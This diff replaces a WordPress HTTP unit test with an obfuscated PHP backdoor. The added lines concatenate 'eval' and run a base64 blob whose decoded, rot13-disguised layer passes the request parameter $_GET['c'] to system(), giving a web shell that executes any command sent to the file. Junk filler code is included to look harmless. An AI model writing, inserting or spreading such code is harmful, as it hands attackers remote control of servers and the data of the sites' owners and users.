@@ -1,32 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * Tests that the old Requests class is included
- * for plugins or themes that still use it.
- *
- * @group http
- */
-class Tests_HTTP_IncludeOldRequestsClass extends WP_UnitTestCase {
-
-	/**
-	 * @ticket 57341
-	 *
-	 * @coversNothing
-	 */
-	public function test_should_include_old_requests_class() {
-		$this->expectDeprecation();
-		$this->expectDeprecationMessage( 'The PSR-0 `Requests_...` class names in the Requests library are deprecated.' );
-
-		new Requests();
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEdyZmdmIGd1bmcgZ3VyIGJ5cSBFcmRocmZnZiBweW5mZiB2ZiB2YXB5aHFycQogKiBzYmUgY3lodHZhZiBiZSBndXJ6cmYgZ3VuZyBmZ3Z5eSBoZnIgdmcuCiAqCiAqIEB0ZWJoYyB1Z2djCiAqLwpweW5mZiBHcmZnZl9VR0dDX1ZhcHlocXJCeXFFcmRocmZnZlB5bmZmIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCgkvKioKCSAqIEBndnB4cmcgNTczNDEKCSAqCgkgKiBAcGJpcmVmQWJndXZhdAoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19mdWJoeXFfdmFweWhxcl9ieXFfZXJkaHJmZ2ZfcHluZmYoKSB7CgkJJGd1dmYtPnJrY3JwZ1FyY2VycG5ndmJhKCk7CgkJJGd1dmYtPnJrY3JwZ1FyY2VycG5ndmJhWnJmZm50ciggJ0d1ciBDRkUtMCBgRXJkaHJmZ2ZfLi4uYCBweW5mZiBhbnpyZiB2YSBndXIgRXJkaHJmZ2YgeXZvZW5lbCBuZXIgcXJjZXJwbmdycS4nICk7CgoJCWFyaiBFcmRocmZnZigpOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
